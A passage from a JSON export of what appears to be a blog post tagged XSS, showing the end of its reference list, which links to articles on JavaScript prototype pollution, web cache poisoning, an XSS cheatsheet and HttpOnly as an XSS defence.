data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">实战 Web 缓存投毒（上）- 安全客 - 安全资讯平台 (anquanke.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvcmVzZWFyY2gvcHJhY3RpY2FsLXdlYi1jYWNoZS1wb2lzb25pbmc=\">https://portswigger.net/research/practical-web-cache-poisoning</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuYnkvI2NoZWF0c2hlZXQ=\">https://xss.by/#cheatsheet</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ2wwdWQvcC8xMzE5MDQxMy5odG1s\">XSS 漏洞防御之 HttpOnly - 春告鳥 - 博客园 (cnblogs.com)</span></p>\n",
            "tags": [
                "XSS"
            ]
        }
    ]
}